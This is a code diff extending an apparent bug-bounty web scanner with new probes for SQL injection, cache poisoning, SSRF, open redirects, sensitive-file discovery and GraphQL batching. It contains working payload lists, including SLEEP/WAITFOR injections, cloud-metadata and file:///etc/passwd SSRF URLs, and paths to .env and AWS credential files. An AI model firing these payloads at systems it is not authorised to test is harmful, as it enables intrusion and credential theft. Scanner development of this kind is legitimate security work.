@@ -96,6 +96,65 @@ _ABSOLUTE_THRESHOLD_S = 4.0
 _REQUEST_TIMEOUT_S = 15.0   # > SLEEP_SECONDS + 5s tolerance
 _PER_HOST_CAP_S = 60.0      # circuit-breaker: stop probing a host that's slow
 
+# ── Error-based SQLi payloads for parameter testing ────────────────────
+_SQLI_ERROR_PAYLOADS: list[tuple[str, str]] = [
+    ("single_quote", "'"),
+    ("double_quote", '"'),
+    ("quote_or_1eq1", "' OR '1'='1"),
+    ("union_null", "' UNION SELECT NULL--"),
+    ("int_overflow", "999999999999999999999"),
+    ("closing_paren", "')"),
+    ("semicolon_sleep", "'; SELECT 1--"),
+    ("backslash", "\\"),
+    ("comment_break", "'/**/OR/**/1=1--"),
+]
+
+_SQL_ERROR_SIGNATURES: list[str] = [
+    "you have an error in your sql syntax",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "mysql_query",
+    "pg_query",
+    "pg_exec",
+    "sqlite3.operationalerror",
+    "unclosed quotation mark",
+    "unterminated string",
+    "syntax error at or near",
+    "ORA-01756",
+    "ORA-00933",
+    "quoted string not properly terminated",
+    "microsoft ole db provider for sql server",
+    "microsoft sql native client",
+    "odbc sql server driver",
+    "sqlstate",
+    "jdbc.sqlex",
+    "org.postgresql",
+    "com.mysql.jdbc",
+    "sql syntax.*mysql",
+    "valid mysql result",
+    "mysqlclient",
+    "psycopg2.errors",
+    "sqlite_error",
+    "near \":\": syntax error",
+    "sql command not properly ended",
+    "division by zero",
+    "supplied argument is not a valid mysql",
+    "Warning: mysql_",
+    "Warning: pg_",
+    "Warning: sqlite_",
+]
+
+_SQLI_PARAM_TIME_PAYLOADS: list[tuple[str, str]] = [
+    ("mysql_sleep_squote", "1' AND SLEEP(5)-- -"),
+    ("mysql_sleep_dquote", '1" AND SLEEP(5)-- -'),
+    ("mysql_sleep_int", "1 AND SLEEP(5)-- -"),
+    ("pg_sleep_squote", "1'; SELECT pg_sleep(5)-- -"),
+    ("pg_sleep_int", "1; SELECT pg_sleep(5)-- -"),
+    ("mssql_waitfor", "1'; WAITFOR DELAY '0:0:5'-- -"),
+    ("mysql_benchmark", "1' AND BENCHMARK(10000000,SHA1('test'))-- -"),
+    ("sqlite_like_bomb", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(250000000))))-- -"),
+]
+
 # These headers mirror the bug-bounty PoC enough to avoid some edge-layer
 # bot/WAF blocks that otherwise return an immediate 403 before the origin
 # app is reached (which would mask a real time-based delay signal).
@@ -218,36 +277,22 @@ async def run_bare_root_sqli_probe(
     http_client,
     hosts: Iterable[str],
     *,
+    crawled_urls: Iterable[str] | None = None,
     on_finding: callable | None = None,
     on_progress: callable | None = None,
     cancel_flag=None,
 ) -> list[dict]:
-    """Probe every host's bare root URL for time-based blind SQLi.
+    """Probe hosts for SQL injection via two layers:
 
-    For each host:
-      1. Send control ``GET https://<host>/?ninjeee=sectest`` and record elapsed.
-      2. For each payload, send ``GET https://<host>/?<payload>?ninjeee=sectest``
-         and record elapsed.
-      3. If any attack >= control + 3.0s AND >= 4.0s absolute, send the
-         attack a second time to rule out network jitter.
-      4. If the second attempt also >= control + 3.0s, emit a Critical
-         SQLi finding.
+    **Layer 1 — Bare-root time-based blind** (original):
+      1. Send control ``GET https://<host>/?ninjeee=sectest``.
+      2. For each payload, send ``GET https://<host>/?<payload>?ninjeee=sectest``.
+      3. If delta >= 3.0s AND absolute >= 4.0s, confirm with a re-test.
 
-    Args:
-        http_client: an httpx.AsyncClient (or compatible) already
-            configured with the scanner's user agent / cookies / TLS
-            settings.
-        hosts: iterable of hostnames or URLs in scope. Anything outside
-            this list is left alone — we never expand scope.
-        on_finding: optional callback invoked with each finding dict.
-        on_progress: optional callback ``(event_name, data_dict)`` for
-            live progress reporting (mirrors passive_recon's pattern).
-        cancel_flag: optional ``threading.Event`` — checked between hosts
-            so a user-initiated stop drops out cleanly without finishing
-            the remaining probes.
-
-    Returns:
-        list[dict] of finding dicts. Empty list if nothing fires.
+    **Layer 2 — Parameter-aware SQLi** (new):
+      1. Discover params from crawled URLs and page HTML.
+      2. Test each param for error-based SQLi (SQL error signatures).
+      3. Test each param for time-based blind SQLi on discovered pages.
     """
     findings: list[dict] = []
     _emit = on_finding or (lambda f: None)
@@ -356,6 +401,188 @@ async def run_bare_root_sqli_probe(
         "hosts": len(targets),
         "findings": len(findings),
     })
+
+    # ── Layer 2: Parameter-aware SQLi (crawled URL params) ─────────────
+    # Same pattern as the XSS 4-layer approach: discover params from
+    # crawled pages and test each for error-based + time-based SQLi.
+    _progress("active_baseline_start", {
+        "probe": "param_sqli", "hosts": len(targets),
+    })
+
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in (crawled_urls or []):
+        try:
+            h = (urlparse(curl).hostname or "").lower()
+            if h:
+                _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            continue
+
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        combined_html = ""
+        try:
+            page_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=True,
+                headers=_PROBE_HEADERS,
+            )
+            combined_html = page_resp.text[:500_000]
+        except Exception:
+            pass
+
+        for curl in _crawled_by_host.get(host, [])[:20]:
+            try:
+                cresp = await http_client.get(
+                    curl, timeout=8.0, follow_redirects=True,
+                    headers=_PROBE_HEADERS,
+                )
+                combined_html += cresp.text[:300_000]
+            except Exception:
+                continue
+
+        discovered = _discover_params_from_html(combined_html, base_url)
+        if not discovered:
+            continue
+
+        _progress("active_baseline_step", {
+            "host": host, "step": "sqli_params_discovered",
+            "count": len(discovered), "params": sorted(discovered)[:20],
+        })
+
+        test_pages = [base_url]
+        for curl in _crawled_by_host.get(host, [])[:15]:
+            if '?' in curl or not any(curl.lower().endswith(e)
+                    for e in ('.js', '.css', '.png', '.jpg', '.gif',
+                              '.svg', '.woff', '.woff2', '.ico', '.map')):
+                cp = urlparse(curl)
+                page_base = f"{cp.scheme}://{cp.netloc}{cp.path or '/'}"
+                if page_base not in test_pages:
+                    test_pages.append(page_base)
+
+        for param in sorted(discovered)[:15]:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+
+            for page_url in test_pages[:5]:
+                sep = "&" if "?" in page_url else "?"
+
+                # ── Error-based SQLi ──
+                for elabel, epayload in _SQLI_ERROR_PAYLOADS:
+                    test_url = f"{page_url}{sep}{param}={epayload}"
+                    try:
+                        resp = await http_client.get(
+                            test_url, timeout=10.0, follow_redirects=True,
+                            headers=_PROBE_HEADERS,
+                        )
+                        body = resp.text[:100_000]
+                    except Exception:
+                        continue
+
+                    matched_errors = [
+                        sig for sig in _SQL_ERROR_SIGNATURES
+                        if sig.lower() in body.lower()
+                    ]
+                    if matched_errors:
+                        key = (host, param, "error")
+                        if key in seen_keys:
+                            continue
+                        seen_keys.add(key)
+                        f = {
+                            "title": f"Error-Based SQL Injection via '{param}'",
+                            "severity": "Critical",
+                            "confidence": "High",
+                            "owasp_category": "A03:2021",
+                            "cwe": "CWE-89",
+                            "url": test_url,
+                            "parameter": param,
+                            "payload": epayload,
+                            "evidence": (
+                                f"Injecting {elabel} payload into param '{param}' "
+                                f"at {page_url} produced SQL error messages: "
+                                f"{', '.join(matched_errors[:3])}. "
+                                f"Response status: {resp.status_code}."
+                            ),
+                            "remediation": (
+                                "Use parameterized queries / prepared statements. "
+                                "Never concatenate user input into SQL. Disable "
+                                "verbose SQL error messages in production."
+                            ),
+                            "phase": "Active Baseline (Error-Based SQLi)",
+                            "tool": "active_baseline.param_sqli_probe",
+                            "_finding_source": "active_baseline",
+                            "_payload_label": elabel,
+                        }
+                        findings.append(f)
+                        _emit(f)
+                        break
+
+                # ── Time-based blind SQLi on discovered params ──
+                benign_url = f"{page_url}{sep}{param}=1"
+                control_elapsed, control_status = await _timed_get(
+                    http_client, benign_url)
+                if control_status is None:
+                    continue
+
+                for tlabel, tpayload in _SQLI_PARAM_TIME_PAYLOADS:
+                    if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                        break
+                    attack_url = f"{page_url}{sep}{param}={tpayload}"
+                    attack_elapsed, attack_status = await _timed_get(
+                        http_client, attack_url)
+                    if attack_status is None:
+                        continue
+                    delta = attack_elapsed - control_elapsed
+                    if delta < _DELTA_THRESHOLD_S or attack_elapsed < _ABSOLUTE_THRESHOLD_S:
+                        continue
+
+                    await asyncio.sleep(0.5)
+                    confirm_elapsed, confirm_status = await _timed_get(
+                        http_client, attack_url)
+                    if confirm_status is None:
+                        continue
+                    confirm_delta = confirm_elapsed - control_elapsed
+                    if confirm_delta < _DELTA_THRESHOLD_S or confirm_elapsed < _ABSOLUTE_THRESHOLD_S:
+                        continue
+
+                    key = (host, param, "time")
+                    if key in seen_keys:
+                        continue
+                    seen_keys.add(key)
+                    f = {
+                        "title": f"Blind Time-Based SQL Injection via '{param}'",
+                        "severity": "Critical",
+                        "confidence": "High",
+                        "owasp_category": "A03:2021",
+                        "cwe": "CWE-89",
+                        "url": attack_url,
+                        "parameter": param,
+                        "payload": tpayload,
+                        "evidence": (
+                            f"Control GET {benign_url}: {control_elapsed:.2f}s. "
+                            f"Attack GET with {tlabel}: {attack_elapsed:.2f}s "
+                            f"(delta {delta:.2f}s). Confirmed on re-test: "
+                            f"{confirm_elapsed:.2f}s (delta {confirm_delta:.2f}s). "
+                            f"SLEEP payload triggered via param '{param}'."
+                        ),
+                        "remediation": (
+                            "Use parameterized queries. Never interpolate "
+                            "user-controlled values into SQL."
+                        ),
+                        "phase": "Active Baseline (Param SQLi)",
+                        "tool": "active_baseline.param_sqli_probe",
+                        "_finding_source": "active_baseline",
+                        "_payload_label": tlabel,
+                    }
+                    findings.append(f)
+                    _emit(f)
+                    break
+
+    _progress("active_baseline_end", {
+        "probe": "param_sqli", "findings": len(findings),
+    })
     return findings
 
 
@@ -381,6 +608,13 @@ _CACHE_POISON_HEADERS: list[tuple[str, str]] = [
     ("X-Forwarded-Scheme", "nothttps"),
     ("X-Forwarded-Port", "1337"),
     ("X-Forwarded-Prefix", "/{canary}"),
+    ("X-Original-Host", "{canary}"),
+    ("X-Forwarded-Server", "{canary}"),
+    ("X-HTTP-Method-Override", "POST"),
+    ("X-Real-IP", "127.0.0.1"),
+    ("Forwarded", "host={canary}"),
+    ("CF-Connecting-IP", "127.0.0.1"),
+    ("True-Client-IP", "127.0.0.1"),
 ]
 
 
@@ -388,11 +622,14 @@ async def run_cache_poisoning_probe(
     http_client,
     hosts: Iterable[str],
     *,
+    crawled_urls: Iterable[str] | None = None,
     on_finding: callable | None = None,
     on_progress: callable | None = None,
     cancel_flag=None,
 ) -> list[dict]:
-    """Probe each host for web cache poisoning via unkeyed header reflection."""
+    """Probe each host for web cache poisoning via unkeyed header reflection.
+
+    Tests root URL and up to 10 crawled sub-pages per host."""
     findings: list[dict] = []
     _emit = on_finding or (lambda f: None)
     _progress = on_progress or (lambda event, data: None)
@@ -408,87 +645,108 @@ async def run_cache_poisoning_probe(
     import hashlib, os  # noqa: E401
     canary = f"cpcanary{hashlib.md5(os.urandom(4)).hexdigest()[:8]}"
 
+    _crawled_by_host: dict[str, list[str]] = {}
+    for curl in (crawled_urls or []):
+        try:
+            h = (urlparse(curl).hostname or "").lower()
+            if h:
+                _crawled_by_host.setdefault(h, []).append(curl)
+        except Exception:
+            continue
+
+    _static_exts = ('.js', '.css', '.png', '.jpg', '.gif', '.svg',
+                    '.woff', '.woff2', '.ttf', '.ico', '.map')
+
     for host in targets:
         if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
             break
         base_url = f"https://{host}/"
-        try:
-            baseline_resp = await http_client.get(
-                base_url, timeout=10.0, follow_redirects=False, headers=_PROBE_HEADERS,
-            )
-            baseline_body = baseline_resp.text[:50_000]
-        except Exception:
-            continue
 
-        for hdr_name, hdr_tpl in _CACHE_POISON_HEADERS:
-            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
-                break
-            hdr_val = hdr_tpl.format(canary=canary)
-            probe_headers = {**_PROBE_HEADERS, hdr_name: hdr_val}
-            cache_buster = f"cb={hashlib.md5(os.urandom(4)).hexdigest()[:6]}"
-            probe_url = f"{base_url}?{cache_buster}"
+        pages_to_test = [base_url]
+        for curl in _crawled_by_host.get(host, [])[:20]:
+            if not any(curl.lower().endswith(e) for e in _static_exts):
+                if curl not in pages_to_test:
+                    pages_to_test.append(curl)
+
+        for test_page in pages_to_test[:10]:
             try:
-                probe_resp = await http_client.get(
-                    probe_url, timeout=10.0, follow_redirects=False,
-                    headers=probe_headers,
-                )
-            except Exception:
-                continue
-
-            reflected = False
-            location = str(probe_resp.headers.get("location", ""))
-            body = probe_resp.text[:50_000]
-            if canary in body or canary in location:
-                reflected = True
-
-            if not reflected:
-                continue
-
-            _progress("active_baseline_step", {
-                "host": host, "step": "cache_poison_reflected",
-                "header": hdr_name, "canary": canary,
-            })
-
-            await asyncio.sleep(1.0)
-            try:
-                verify_resp = await http_client.get(
-                    probe_url, timeout=10.0, follow_redirects=False,
+                baseline_resp = await http_client.get(
+                    test_page, timeout=10.0, follow_redirects=False,
                     headers=_PROBE_HEADERS,
                 )
-                verify_body = verify_resp.text[:50_000]
-                verify_location = str(verify_resp.headers.get("location", ""))
-                cached = canary in verify_body or canary in verify_location
+                baseline_body = baseline_resp.text[:50_000]
             except Exception:
-                cached = False
+                continue
 
-            severity = "High" if cached else "Medium"
-            confidence = "High" if cached else "Medium"
-            f = {
-                "title": f"Web Cache Poisoning via {hdr_name}",
-                "severity": severity,
-                "confidence": confidence,
-                "owasp_category": "A05:2021",
-                "cwe": "CWE-444",
-                "url": probe_url,
-                "parameter": hdr_name,
-                "payload": f"{hdr_name}: {hdr_val}",
-                "evidence": (
-                    f"Canary '{canary}' reflected in "
-                    f"{'response body' if canary in body else 'Location header'} "
-                    f"when sent via {hdr_name}. "
-                    f"Cache verification: {'CACHED (confirmed poisoning)' if cached else 'not cached (reflection only)'}."
-                ),
-                "remediation": (
-                    f"Ensure {hdr_name} is either stripped by the CDN/cache layer "
-                    f"or included in the cache key. Validate and sanitize all "
-                    f"host-related headers before reflecting them in responses."
-                ),
-                "phase": "Active Baseline (Cache Poisoning)",
-                "tool": "active_baseline.cache_poisoning_probe",
-                "_finding_source": "active_baseline",
-            }
-            findings.append(f)
-            _emit(f)
+            for hdr_name, hdr_tpl in _CACHE_POISON_HEADERS:
+                if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                    break
+                hdr_val = hdr_tpl.format(canary=canary)
+                probe_headers = {**_PROBE_HEADERS, hdr_name: hdr_val}
+                cache_buster = f"cb={hashlib.md5(os.urandom(4)).hexdigest()[:6]}"
+                probe_url = f"{test_page}{'&' if '?' in test_page else '?'}{cache_buster}"
+                try:
+                    probe_resp = await http_client.get(
+                        probe_url, timeout=10.0, follow_redirects=False,
+                        headers=probe_headers,
+                    )
+                except Exception:
+                    continue
+
+                reflected = False
+                location = str(probe_resp.headers.get("location", ""))
+                body = probe_resp.text[:50_000]
+                if canary in body or canary in location:
+                    reflected = True
+
+                if not reflected:
+                    continue
+
+                _progress("active_baseline_step", {
+                    "host": host, "step": "cache_poison_reflected",
+                    "header": hdr_name, "canary": canary, "page": test_page,
+                })
+
+                await asyncio.sleep(1.0)
+                try:
+                    verify_resp = await http_client.get(
+                        probe_url, timeout=10.0, follow_redirects=False,
+                        headers=_PROBE_HEADERS,
+                    )
+                    verify_body = verify_resp.text[:50_000]
+                    verify_location = str(verify_resp.headers.get("location", ""))
+                    cached = canary in verify_body or canary in verify_location
+                except Exception:
+                    cached = False
+
+                severity = "High" if cached else "Medium"
+                confidence = "High" if cached else "Medium"
+                f = {
+                    "title": f"Web Cache Poisoning via {hdr_name}",
+                    "severity": severity,
+                    "confidence": confidence,
+                    "owasp_category": "A05:2021",
+                    "cwe": "CWE-444",
+                    "url": probe_url,
+                    "parameter": hdr_name,
+                    "payload": f"{hdr_name}: {hdr_val}",
+                    "evidence": (
+                        f"Canary '{canary}' reflected in "
+                        f"{'response body' if canary in body else 'Location header'} "
+                        f"when sent via {hdr_name} at {test_page}. "
+                        f"Cache verification: {'CACHED (confirmed poisoning)' if cached else 'not cached (reflection only)'}."
+                    ),
+                    "remediation": (
+                        f"Ensure {hdr_name} is either stripped by the CDN/cache layer "
+                        f"or included in the cache key. Validate and sanitize all "
+                        f"host-related headers before reflecting them in responses."
+                    ),
+                    "phase": "Active Baseline (Cache Poisoning)",
+                    "tool": "active_baseline.cache_poisoning_probe",
+                    "_finding_source": "active_baseline",
+                }
+                findings.append(f)
+                _emit(f)
 
     _progress("active_baseline_end", {
         "probe": "cache_poisoning", "findings": len(findings),
@@ -1304,17 +1562,46 @@ _SSRF_PARAM_NAME_HINTS = _re.compile(
 )
 
 _SSRF_PAYLOADS: list[tuple[str, str, str]] = [
+    # AWS metadata
     ("aws_metadata_plain", "http://169.254.169.254/latest/meta-data/", "ami-id"),
     ("aws_metadata_hex", "http://0xa9fea9fe/latest/meta-data/", "ami-id"),
     ("aws_metadata_decimal", "http://2852039166/latest/meta-data/", "ami-id"),
     ("aws_metadata_ipv6", "http://[::ffff:169.254.169.254]/latest/meta-data/", "ami-id"),
+    ("aws_imdsv2_token", "http://169.254.169.254/latest/api/token", ""),
+    # GCP metadata
     ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "attributes"),
+    ("gcp_metadata_ip", "http://169.254.169.254/computeMetadata/v1/", "attributes"),
+    # Azure metadata
+    ("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"),
+    # Localhost variations
     ("localhost_127001", "http://127.0.0.1:80/", ""),
     ("localhost_hex", "http://0x7f000001/", ""),
     ("localhost_decimal", "http://2130706433/", ""),
     ("localhost_ipv6", "http://[::1]/", ""),
     ("localhost_short", "http://127.1/", ""),
     ("localhost_0000", "http://0.0.0.0/", ""),
+    ("localhost_octal", "http://0177.0.0.1/", ""),
+    # URL schema bypasses
+    ("file_etc_passwd", "file:///etc/passwd", "root:"),
+    ("file_win_hosts", "file:///c:/windows/system32/drivers/etc/hosts", "localhost"),
+    # DNS rebinding / redirect bypass
+    ("redirect_bypass_at", "http://127.0.0.1@evil.example.com/", ""),
+    ("redirect_bypass_hash", "http://evil.example.com#@127.0.0.1/", ""),
+    # Internal common ports
+    ("internal_8080", "http://127.0.0.1:8080/", ""),
+    ("internal_3000", "http://127.0.0.1:3000/", ""),
+    ("internal_9200_es", "http://127.0.0.1:9200/", "cluster_name"),
+    ("internal_6379_redis", "http://127.0.0.1:6379/", ""),
+    ("internal_11211_memcache", "http://127.0.0.1:11211/", ""),
+]
+
+_SSRF_HEADER_PAYLOADS: list[tuple[str, str, str]] = [
+    ("x_forwarded_for_internal", "X-Forwarded-For", "127.0.0.1"),
+    ("x_real_ip_internal", "X-Real-IP", "127.0.0.1"),
+    ("x_originating_ip", "X-Originating-IP", "127.0.0.1"),
+    ("x_client_ip", "X-Client-IP", "127.0.0.1"),
+    ("client_ip", "Client-IP", "127.0.0.1"),
+    ("x_forwarded_for_metadata", "X-Forwarded-For", "169.254.169.254"),
 ]
 
 _SSRF_FALLBACK_PARAMS = ["url", "redirect", "next", "target", "dest",
@@ -1494,6 +1781,82 @@ async def run_ssrf_probe(
                 _emit(f)
                 break
 
+    # ── Header-based SSRF ──
+    for host in targets:
+        if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+            break
+        base_url = f"https://{host}"
+
+        try:
+            normal_resp = await http_client.get(
+                base_url, timeout=10.0, follow_redirects=False,
+                headers=_PROBE_HEADERS,
+            )
+            normal_status = normal_resp.status_code
+            normal_body = normal_resp.text[:20_000]
+            normal_len = len(normal_resp.text)
+        except Exception:
+            continue
+
+        for hlabel, hdr_name, hdr_val in _SSRF_HEADER_PAYLOADS:
+            if cancel_flag is not None and getattr(cancel_flag, "is_set", lambda: False)():
+                break
+            try:
+                resp = await http_client.get(
+                    base_url, timeout=10.0, follow_redirects=False,
+                    headers={**_PROBE_HEADERS, hdr_name: hdr_val},
+                )
+                body = resp.text[:50_000]
+                status = resp.status_code
+            except Exception:
+                continue
+
+            is_ssrf = False
+            evidence_detail = ""
+
+            if status != normal_status and status in (200, 301, 302, 403):
+                is_ssrf = True
+                evidence_detail = (
+                    f"Status changed from {normal_status} to {status} "
+                    f"when {hdr_name}: {hdr_val} was injected."
+                )
+            elif abs(len(body) - normal_len) > 500 and hdr_val in body:
+                is_ssrf = True
+                evidence_detail = (
+                    f"Response body changed significantly "
+                    f"(normal: {normal_len} bytes, with header: {len(body)} bytes) "
+                    f"and contains the injected IP."
+                )
+
+            if not is_ssrf:
+                continue
+
+            f = {
+                "title": f"Header-Based SSRF / IP Spoofing via {hdr_name}",
+                "severity": "Medium",
+                "confidence": "Medium",
+                "owasp_category": "A10:2021",
+                "cwe": "CWE-918",
+                "url": base_url,
+                "parameter": hdr_name,
+                "payload": f"{hdr_name}: {hdr_val}",
+                "evidence": (
+                    f"Injecting {hdr_name}: {hdr_val} changed server behavior. "
+                    f"{evidence_detail}"
+                ),
+                "remediation": (
+                    f"Do not trust {hdr_name} headers for access control or "
+                    f"routing decisions. Validate all IP-based headers against "
+                    f"trusted proxy sources."
+                ),
+                "phase": "Active Baseline (SSRF Bypass)",
+                "tool": "active_baseline.ssrf_probe",
+                "_finding_source": "active_baseline",
+                "_payload_label": hlabel,
+            }
+            findings.append(f)
+            _emit(f)
+
     _progress("active_baseline_end", {
         "probe": "ssrf_bypass", "findings": len(findings),
     })
@@ -1523,6 +1886,14 @@ _REDIRECT_PAYLOADS: list[tuple[str, str]] = [
     ("at_bypass", f"https://legitimate.com@{_REDIRECT_CANARY_DOMAIN}/"),
     ("null_byte", f"https://{_REDIRECT_CANARY_DOMAIN}/%00"),
     ("encoded_slash", f"https:%2F%2F{_REDIRECT_CANARY_DOMAIN}/redir"),
+    ("backslash_scheme", f"/\\{_REDIRECT_CANARY_DOMAIN}"),
+    ("tab_bypass", f"//\t{_REDIRECT_CANARY_DOMAIN}"),
+    ("dotdot_bypass", f"/{_REDIRECT_CANARY_DOMAIN}/%2F.."),
+    ("crlf_bypass", f"/%0d%0aLocation: https://{_REDIRECT_CANARY_DOMAIN}/"),
+    ("data_uri", "data:text/html,<script>alert(1)</script>"),
+    ("javascript_uri", "javascript:alert(1)"),
+    ("triple_slash", f"///{_REDIRECT_CANARY_DOMAIN}"),
+    ("whitespace_bypass", f" https://{_REDIRECT_CANARY_DOMAIN}"),
 ]
 
 
@@ -1663,26 +2034,87 @@ async def run_open_redirect_probe(
 # debug endpoints, status pages, etc. that leak server configuration.
 
 _SENSITIVE_PATHS: list[tuple[str, str, list[str]]] = [
+    # PHP info disclosure
     ("phpinfo", "/index.php", ["phpinfo()", "PHP Version", "System =>"]),
     ("phpinfo_info", "/info.php", ["phpinfo()", "PHP Version"]),
     ("phpinfo_test", "/test.php", ["phpinfo()", "PHP Version"]),
     ("phpinfo_phpinfo", "/phpinfo.php", ["phpinfo()", "PHP Version"]),
+    # Configuration files
     ("dotenv", "/.env", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
+    ("dotenv_bak", "/.env.bak", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
+    ("dotenv_old", "/.env.old", ["DB_PASSWORD", "APP_KEY", "SECRET"]),
+    ("dotenv_dev", "/.env.development", ["DB_PASSWORD", "APP_KEY"]),
+    ("dotenv_prod", "/.env.production", ["DB_PASSWORD", "APP_KEY"]),
+    ("dotenv_local", "/.env.local", ["DB_PASSWORD", "APP_KEY"]),
+    ("wp_config_bak", "/wp-config.php.bak", ["DB_NAME", "DB_PASSWORD"]),
+    ("wp_config_old", "/wp-config.php.old", ["DB_NAME", "DB_PASSWORD"]),
+    ("wp_config_save", "/wp-config.php.save", ["DB_NAME", "DB_PASSWORD"]),
+    ("config_yml", "/config.yml", ["password", "secret", "database"]),
+    ("config_json", "/config.json", ["password", "secret", "apiKey"]),
+    ("appsettings", "/appsettings.json", ["ConnectionStrings", "Password"]),
+    ("web_config_bak", "/web.config.bak", ["connectionString", "password"]),
+    # Git / VCS
     ("git_config", "/.git/config", ["[core]", "[remote"]),
     ("git_head", "/.git/HEAD", ["ref: refs/"]),
+    ("svn_entries", "/.svn/entries", ["dir", "svn"]),
+    ("hg_manifest", "/.hg/store/00manifest.i", []),
+    # Cloud metadata & credentials
+    ("aws_credentials", "/.aws/credentials", ["aws_access_key_id", "aws_secret_access_key"]),
+    ("docker_compose", "/docker-compose.yml", ["services:", "image:"]),
+    ("dockerfile", "/Dockerfile", ["FROM", "RUN"]),
+    # Backup files
     ("ds_store", "/.DS_Store", []),
-    ("wp_config_bak", "/wp-config.php.bak", ["DB_NAME", "DB_PASSWORD"]),
+    ("backup_sql", "/backup.sql", ["INSERT INTO", "CREATE TABLE"]),
+    ("dump_sql", "/dump.sql", ["INSERT INTO", "CREATE TABLE"]),
+    ("db_sqlite", "/db.sqlite", []),
+    ("db_sqlite3", "/db.sqlite3", []),
+    # Debug & monitoring
     ("server_status", "/server-status", ["Apache Server Status", "Total accesses"]),
+    ("server_info", "/server-info", ["Apache Server Information", "Server Version"]),
     ("debug_vars", "/debug/vars", []),
+    ("debug_pprof", "/debug/pprof/", ["allocs", "goroutine"]),
+    ("debug_default", "/debug/default", []),
+    ("metrics", "/metrics", ["process_cpu", "go_gc", "http_requests"]),
+    ("prometheus", "/_prometheus/metrics", ["process_cpu", "http_requests"]),
+    ("health_full", "/health", ["status", "healthy"]),
+    # Spring / Java
     ("actuator", "/actuator", ["_links", "self"]),
     ("actuator_env", "/actuator/env", ["activeProfiles", "propertySources"]),
+    ("actuator_configprops", "/actuator/configprops", ["contexts", "beans"]),
+    ("actuator_mappings", "/actuator/mappings", ["dispatcherServlets", "handler"]),
+    ("actuator_heapdump", "/actuator/heapdump", []),
+    ("actuator_threaddump", "/actuator/threaddump", ["threads", "threadName"]),
+    ("jolokia", "/jolokia/", ["request", "value"]),
+    # .NET
     ("elmah", "/elmah.axd", ["Error Log for"]),
-    ("trace", "/trace", []),
+    ("trace_axd", "/trace.axd", ["Request Details", "Trace Information"]),
+    # Node / JS
+    ("package_json", "/package.json", ["dependencies", "name"]),
+    ("npm_debug", "/npm-debug.log", ["npm ERR", "error"]),
+    ("yarn_lock", "/yarn.lock", ["resolved", "integrity"]),
+    # API docs
     ("swagger_json", "/swagger.json", ["swagger", "paths"]),
+    ("swagger_v2", "/v2/api-docs", ["swagger", "paths"]),
+    ("swagger_v3", "/v3/api-docs", ["openapi", "paths"]),
     ("api_docs", "/api-docs", ["swagger", "openapi"]),
+    ("openapi_yaml", "/openapi.yaml", ["openapi", "paths"]),
+    ("redoc", "/redoc", []),
+    # GraphQL
     ("graphql", "/graphql", []),
+    ("graphql_playground", "/graphql/playground", []),
+    ("graphiql", "/graphiql", []),
+    # Crawlable info
     ("robots_txt", "/robots.txt", ["Disallow"]),
     ("sitemap", "/sitemap.xml", ["<urlset", "<sitemapindex"]),
+    ("security_txt", "/.well-known/security.txt", ["Contact:", "Expires:"]),
+    ("crossdomain", "/crossdomain.xml", ["cross-domain-policy", "allow-access"]),
+    ("clientaccesspolicy", "/clientaccesspolicy.xml", ["cross-domain-policy"]),
+    # Misc
+    ("trace", "/trace", []),
+    ("admin", "/admin", []),
+    ("phpmyadmin", "/phpmyadmin/", ["phpMyAdmin"]),
+    ("adminer", "/adminer.php", ["adminer", "Login"]),
+    ("wp_login", "/wp-login.php", ["WordPress"]),
 ]
 
 
@@ -2166,7 +2598,90 @@ async def run_graphql_introspection_probe(
             }
             findings.append(f)
             _emit(f)
-            break  # one hit per host is enough
+
+            # ── Batching attack (DoS / rate limit bypass) ──
+            batch_query = '[' + ','.join(
+                ['{"query":"{ __typename }"}'] * 10
+            ) + ']'
+            try:
+                batch_resp = await http_client.post(
+                    url, content=batch_query, timeout=10.0,
+                    headers=gql_headers,
+                )
+                batch_body = batch_resp.text[:20_000]
+                if batch_resp.status_code == 200 and batch_body.startswith('['):
+                    import json as _json_gql
+                    try:
+                        results = _json_gql.loads(batch_body)
+                        if isinstance(results, list) and len(results) >= 5:
+                            bf = {
+                                "title": f"GraphQL Batching Attack Possible ({gql_path})",
+                                "severity": "Medium",
+                                "confidence": "High",
+                                "owasp_category": "A04:2021",
+                                "cwe": "CWE-770",
+                                "url": url,
+                                "parameter": gql_path,
+                                "payload": "10-query batch array",
+                                "evidence": (
+                                    f"GraphQL endpoint at {url} accepts batched "
+                                    f"queries (array of operations). Sent 10 queries, "
+                                    f"received {len(results)} responses. This can bypass "
+                                    f"rate limiting and amplify brute-force attacks."
+                                ),
+                                "remediation": (
+                                    "Limit the number of operations in a single "
+                                    "batched request. Implement query cost analysis "
+                                    "and depth limiting."
+                                ),
+                                "phase": "Active Baseline (GraphQL Batching)",
+                                "tool": "active_baseline.graphql_introspection_probe",
+                                "_finding_source": "active_baseline",
+                            }
+                            findings.append(bf)
+                            _emit(bf)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+            # ── Field suggestion exploit (schema leakage without introspection) ──
+            suggestion_query = '{"query":"{ __typena }"}'
+            try:
+                sugg_resp = await http_client.post(
+                    url, content=suggestion_query, timeout=10.0,
+                    headers=gql_headers,
+                )
+                sugg_body = sugg_resp.text[:10_000].lower()
+                if "did you mean" in sugg_body or "suggestion" in sugg_body:
+                    sf = {
+                        "title": f"GraphQL Field Suggestion Leaks Schema ({gql_path})",
+                        "severity": "Low",
+                        "confidence": "High",
+                        "owasp_category": "A01:2021",
+                        "cwe": "CWE-200",
+                        "url": url,
+                        "parameter": gql_path,
+                        "payload": "{ __typena }",
